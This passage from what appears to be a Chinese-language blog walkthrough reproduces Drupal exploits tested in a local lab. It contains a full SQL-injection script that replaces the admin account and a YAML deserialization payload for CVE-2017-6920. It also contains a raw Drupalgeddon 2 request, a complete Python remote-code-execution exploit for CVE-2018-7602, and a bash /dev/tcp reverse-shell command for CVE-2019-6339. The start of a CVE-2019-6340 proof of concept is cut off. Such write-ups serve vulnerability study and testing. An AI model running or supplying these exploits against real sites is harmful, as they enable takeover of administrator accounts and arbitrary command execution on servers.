class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2,sys</span><br><span class="line"><span class="keyword">from</span> drupalpass <span class="keyword">import</span> DrupalHash </span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">user = sys.argv[<span class="number">2</span>]</span><br><span class="line">password = sys.argv[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"host username password"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"http://nope.io admin wowsecure"</span></span><br><span class="line">hash = DrupalHash(<span class="string">"$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML"</span>, password).get_hash()</span><br><span class="line">target = <span class="string">'%s/?q=node&amp;destination=node'</span> % host</span><br><span class="line">post_data = <span class="string">"name[0%20;update+users+set+name%3d\'"</span> \</span><br><span class="line">            +user \</span><br><span class="line">            +<span class="string">"'+,+pass+%3d+'"</span> \</span><br><span class="line">            +hash[:<span class="number">55</span>] \</span><br><span class="line">            +<span class="string">"'+where+uid+%3d+\'1\';;#%20%20]=bob&amp;name[0]=larry&amp;pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in"</span></span><br><span class="line">content = urllib2.urlopen(url=target, data=post_data).read()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"mb_strlen() expects parameter 1"</span> <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Success!\nLogin now with user:%s and pass:%s"</span> % (user, password)</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate a non-truncated Drupal 7 compatible password hash.</span></span><br><span class="line"><span class="comment"># The consumer of these hashes must truncate correctly.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DrupalHash</span>:</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, stored_hash, password)</span>:</span></span><br><span class="line">    self.itoa64 = <span class="string">'./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    self.last_hash = self.rehash(stored_hash, password)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_hash</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.last_hash</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">password_get_count_log2</span><span class="params">(self, setting)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.itoa64.index(setting[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">password_crypt</span><span class="params">(self, algo, password, setting)</span>:</span></span><br><span class="line">    setting = setting[<span class="number">0</span>:<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">if</span> setting[<span class="number">0</span>] != <span class="string">'$'</span> <span class="keyword">or</span> setting[<span class="number">2</span>] != <span class="string">'$'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    count_log2 = self.password_get_count_log2(setting)</span><br><span class="line">    salt = setting[<span class="number">4</span>:<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">if</span> len(salt) &lt; <span class="number">8</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    count = <span class="number">1</span> &lt;&lt; count_log2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> algo == <span class="string">'md5'</span>:</span><br><span class="line">      hash_func = hashlib.md5</span><br><span class="line">    <span class="keyword">elif</span> algo == <span class="string">'sha512'</span>:</span><br><span class="line">      hash_func = hashlib.sha512</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    hash_str = hash_func(salt + password).digest()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(count):</span><br><span class="line">      hash_str = hash_func(hash_str + password).digest()</span><br><span class="line">    output = setting + self.custom64(hash_str)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">custom64</span><span class="params">(self, string, count = <span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">      count = len(string)</span><br><span class="line">    output = <span class="string">''</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    itoa64 = self.itoa64</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">      value = ord(string[i])</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      output += itoa64[value &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &lt; count:</span><br><span class="line">        value |= ord(string[i]) &lt;&lt; <span class="number">8</span></span><br><span class="line">      output += itoa64[(value &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &gt;= count:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span> i &lt; count:</span><br><span class="line">        value |= ord(string[i]) &lt;&lt; <span class="number">16</span></span><br><span class="line">      output += itoa64[(value &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &gt;= count:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      output += itoa64[(value &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &gt;= count:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">rehash</span><span class="params">(self, stored_hash, password)</span>:</span></span><br><span class="line">    <span class="comment"># Drupal 6 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> len(stored_hash) == <span class="number">32</span> <span class="keyword">and</span> stored_hash.find(<span class="string">'$'</span>) == <span class="number">-1</span>:</span><br><span class="line">      <span class="keyword">return</span> hashlib.md5(password).hexdigest()</span><br><span class="line">      <span class="comment"># Drupal 7</span></span><br><span class="line">    <span class="keyword">if</span> stored_hash[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'U$'</span>:</span><br><span class="line">      stored_hash = stored_hash[<span class="number">1</span>:]</span><br><span class="line">      password = hashlib.md5(password).hexdigest()</span><br><span class="line">    hash_type = stored_hash[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> hash_type == <span class="string">'$S$'</span>:</span><br><span class="line">      hash_str = self.password_crypt(<span class="string">'sha512'</span>, password, stored_hash)</span><br><span class="line">    <span class="keyword">elif</span> hash_type == <span class="string">'$H$'</span> <span class="keyword">or</span> hash_type == <span class="string">'$P$'</span>:</span><br><span class="line">      hash_str = self.password_crypt(<span class="string">'md5'</span>, password, stored_hash)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      hash_str = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> hash_str</span><br></pre></td></tr></table></figure><p>使用上述脚本进行测试，尝试添加管理员用户abc/123123：</p><p><img src="/imgs/image-20201130135646649.png" alt="image-20201130135646649"></p><p>然后用abc/123123登录成功：</p><p><img src="/imgs/image-20201130135754126.png" alt="image-20201130135754126"></p><p>进入mysql容器：</p><p><img src="/imgs/image-20201130140148536.png" alt="image-20201130140148536"></p><p>查看到admin被替换：</p><p><img src="/imgs/image-20201130140221357.png" alt="image-20201130140221357"></p><p>参考链接：<a href="https://www.freebuf.com/vuls/47690.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/47690.html</a></p><h3 id="CVE-2017-6920-Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞"><a href="#CVE-2017-6920-Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞" class="headerlink" title="CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞"></a>CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞</h3><p><strong>利用条件：需要管理员帐号密码</strong></p><h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!php&#x2F;object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>步骤：</p><p>1、登录管理员</p><p>2、访问：<a href="http://192.168.116.132/admin/config/development/configuration/single/import" target="_blank" rel="noopener">http://192.168.116.132/admin/config/development/configuration/single/import</a></p><p>3、<code>Configuration type</code> 选择 <code>Simple configuration</code>，<code>Configuration name</code> 任意填写，<code>Paste your configuration here</code> 中填写POC</p><p><img src="/imgs/image-20201130145620712.png" alt="image-20201130145620712"></p><p><img src="/imgs/image-20201130150000911.png" alt="image-20201130150000911"></p><h3 id="CVE-2018-7600-Drupal-Drupalgeddon-2-远程代码执行"><a href="#CVE-2018-7600-Drupal-Drupalgeddon-2-远程代码执行" class="headerlink" title="CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行"></a>CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行</h3><h4 id="POC：-1"><a href="#POC：-1" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span><br></pre></td></tr></table></figure><p>执行id</p><p><img src="/imgs/image-20201130151519421.png" alt="image-20201130151519421"></p><h3 id="CVE-2018-7602-远程代码执行"><a href="#CVE-2018-7602-远程代码执行" class="headerlink" title="CVE-2018-7602 远程代码执行"></a>CVE-2018-7602 远程代码执行</h3><p>利用条件：需要帐号信息</p><h4 id="POC：-2"><a href="#POC：-2" class="headerlink" title="POC："></a>POC：</h4><p>python3 drupa7-CVE-2018-7602.py -c “id” drupal drupal <a href="http://127.0.0.1:8081/" target="_blank" rel="noopener">http://127.0.0.1:8081/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_args</span><span class="params">()</span>:</span></span><br><span class="line">  parser = argparse.ArgumentParser( prog=<span class="string">"drupa7-CVE-2018-7602.py"</span>,</span><br><span class="line">                    formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                    epilog= <span class="string">'''</span></span><br><span class="line"><span class="string">                    This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58</span></span><br><span class="line"><span class="string">                    using an valid account and poisoning the cancel account form (user_cancel_confirm_form) </span></span><br><span class="line"><span class="string">                    with the 'destination' variable and triggering it with the upload file via ajax (/file/ajax).</span></span><br><span class="line"><span class="string">                    '''</span>)</span><br><span class="line"></span><br><span class="line">  parser.add_argument(<span class="string">"user"</span>, help=<span class="string">"Username"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"password"</span>, help=<span class="string">"Password"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"target"</span>, help=<span class="string">"URL of target Drupal site (ex: http://target.com/)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--command"</span>, default=<span class="string">"id"</span>, help=<span class="string">"Command to execute (default = id)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-f"</span>, <span class="string">"--function"</span>, default=<span class="string">"passthru"</span>, help=<span class="string">"Function to use as attack vector (default = passthru)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-x"</span>, <span class="string">"--proxy"</span>, default=<span class="string">""</span>, help=<span class="string">"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)"</span>)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn_target</span><span class="params">(target, username, password, function, command, proxy)</span>:</span></span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  session = requests.Session()</span><br><span class="line">  proxyConf = &#123;<span class="string">'http'</span>: proxy, <span class="string">'https'</span>: proxy&#125;</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">'[*] Creating a session using the provided credential...'</span>)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>:<span class="string">'user/login'</span>&#125;</span><br><span class="line">    post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_login'</span>, <span class="string">'name'</span>: username, <span class="string">'pass'</span> : password, <span class="string">'op'</span>:<span class="string">'Log in'</span>&#125;</span><br><span class="line">    print(<span class="string">'[*] Finding User ID...'</span>)</span><br><span class="line">    session.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>:<span class="string">'user'</span>&#125;</span><br><span class="line">    r = session.get(target, params=get_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    user_id = soup.find(<span class="string">'meta'</span>, &#123;<span class="string">'property'</span>: <span class="string">'foaf:name'</span>&#125;).get(<span class="string">'about'</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"?q="</span> <span class="keyword">in</span> user_id):</span><br><span class="line">      user_id = user_id.split(<span class="string">"="</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span>(user_id):</span><br><span class="line">      print(<span class="string">'[*] User ID found: '</span> + user_id)</span><br><span class="line">    print(<span class="string">'[*] Poisoning a form using \'destination\' and including it in cache.'</span>)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>: user_id + <span class="string">'/cancel'</span>&#125;</span><br><span class="line">    r = session.get(target, params=get_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    form = soup.find(<span class="string">'form'</span>, &#123;<span class="string">'id'</span>: <span class="string">'user-cancel-confirm-form'</span>&#125;)</span><br><span class="line">    form_token = form.find(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>: <span class="string">'form_token'</span>&#125;).get(<span class="string">'value'</span>)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>: user_id + <span class="string">'/cancel'</span>, <span class="string">'destination'</span> : user_id +<span class="string">'/cancel?q[%23post_render][]='</span> + function + <span class="string">'&amp;q[%23type]=markup&amp;q[%23markup]='</span> + command &#125;</span><br><span class="line">    post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_cancel_confirm_form'</span>,<span class="string">'form_token'</span>: form_token, <span class="string">'_triggering_element_name'</span>:<span class="string">'form_id'</span>, <span class="string">'op'</span>:<span class="string">'Cancel account'</span>&#125;</span><br><span class="line">    r = session.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    form = soup.find(<span class="string">'form'</span>, &#123;<span class="string">'id'</span>: <span class="string">'user-cancel-confirm-form'</span>&#125;)</span><br><span class="line">    form_build_id = form.find(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>: <span class="string">'form_build_id'</span>&#125;).get(<span class="string">'value'</span>)</span><br><span class="line">    <span class="keyword">if</span> form_build_id:</span><br><span class="line">        print(<span class="string">'[*] Poisoned form ID: '</span> + form_build_id)</span><br><span class="line">        print(<span class="string">'[*] Triggering exploit to execute: '</span> + command)</span><br><span class="line">        get_params = &#123;<span class="string">'q'</span>:<span class="string">'file/ajax/actions/cancel/#options/path/'</span> + form_build_id&#125;</span><br><span class="line">        post_params = &#123;<span class="string">'form_build_id'</span>:form_build_id&#125;</span><br><span class="line">        r = session.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">        parsed_result = r.text.split(<span class="string">'[&#123;"command":"settings"'</span>)[<span class="number">0</span>]</span><br><span class="line">        print(parsed_result)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"ERROR: Something went wrong."</span>)</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> ()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'==================================================================================='</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'|   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |'</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'|                                   by pimps                                      |'</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'===================================================================================\n'</span>)</span><br><span class="line"></span><br><span class="line">  args = get_args() <span class="comment"># get the cl args</span></span><br><span class="line">  pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201130162325179.png" alt="image-20201130162325179"></p><h3 id="CVE-2019-6339-远程代码执行"><a href="#CVE-2019-6339-远程代码执行" class="headerlink" title="CVE-2019-6339 远程代码执行"></a>CVE-2019-6339 远程代码执行</h3><p>利用条件：需要管理员帐号信息</p><p>下载利用文件：<a href="https://github.com/thezdi/PoC/tree/master/Drupal" target="_blank" rel="noopener">https://github.com/thezdi/PoC/tree/master/Drupal</a></p><p>进入用户编辑界面<a href="http://192.168.116.132:8080/user/1/edit，上传图片并保存" target="_blank" rel="noopener">http://192.168.116.132:8080/user/1/edit，上传图片并保存</a></p><p><img src="/imgs/image-20201130164147956.png" alt="image-20201130164147956"></p><p>进入<a href="http://192.168.116.132:8080/admin/config/media/file-system界面，在Temporary" target="_blank" rel="noopener">http://192.168.116.132:8080/admin/config/media/file-system界面，在Temporary</a> directory处输入：phar://./sites/default/files/pictures/2020-11/blog-ZDI-CAN-7232-cat.jpg点击保存</p><p><img src="/imgs/image-20201130164759989.png" alt="image-20201130164759989"></p><p><img src="/imgs/image-20201130164743816.png" alt="image-20201130164743816"></p><p>修改命令为创建文件1111：</p><p><img src="/imgs/image-20201130172257094.png" alt="image-20201130172257094"></p><p><img src="/imgs/image-20201130172307261.png" alt="image-20201130172307261"></p><p>尝试getshell，修改图片：s为50即命令字符数为50，命令为/bin/bash -i &gt;&amp; /dev/tcp/192.168.116.132/9999 0&gt;&amp;1。反弹未成功</p><p><img src="/imgs/image-20201130171025740.png" alt="image-20201130171025740"></p><h3 id="CVE-2019-6340-远程代码执行"><a href="#CVE-2019-6340-远程代码执行" class="headerlink" title="CVE-2019-6340 远程代码执行"></a>CVE-2019-6340 远程代码执行</h3><blockquote><p>Drupal Core存在一个远程代码执行漏洞。此次，它的目标是Drupal 8的REST模块，默认情况下，该模块是禁用了，但是该模块在大多数情况下会被用户使用。该漏洞本质上是由于用户使用Drupal Core RESTful Web Services (rest)时，某些字段类型无法正确清理非格式源中的数据。在某些情况下，这可能导致任意PHP代码执行。此外，我们发现针对该漏洞提出的即时补救措施是不完整的，这可能会导致一种错误的安全感。用户可能会根据官方的说明禁用掉RESTful Web Services 中的POST/PATCH方法，但是事实上GET方法也能在无任何权限的情况下执行远程代码，所以用户必须执行Drupal的最新的安全更新或者禁用RESTful Web Services服务，否则网站依旧处于风险当中。</p><p><strong>影响版本</strong></p><p>Drupal 8.6.x &lt; 8.6.10</p><p>Drupal 8.5.x &lt; 8.5.11</p></blockquote><p>可使用脚本：<a href="https://github.com/zhzyker/exphub/blob/master/drupal/cve-2019-6340_cmd.py，也可以使用下列POC" target="_blank" rel="noopener">https://github.com/zhzyker/exphub/blob/master/drupal/cve-2019-6340_cmd.py，也可以使用下列POC</a></p><h4 id="POC：-3"><a href="#POC：-3" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CVE-2019-6340 Drupal &lt;= 8.6.9 REST services RCE PoC</span></span><br><span class="line"><span class="comment"># 2019 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Technical details for this exploit is available at:</span></span><br><span class="line"><span class="comment">#   https://www.drupal.org/sa-core-2019-003</span></span><br><span class="line"><span class="comment">#   https://www.ambionics.io/blog/drupal8-rce</span></span><br><span class="line"><span class="comment">#   https://twitter.com/jcran/status/1099206271901798400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sample usage:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># $ python cve-2019-6340.py http://127.0.0.1/ "ps auxf"</span></span><br><span class="line"><span class="comment"># CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE 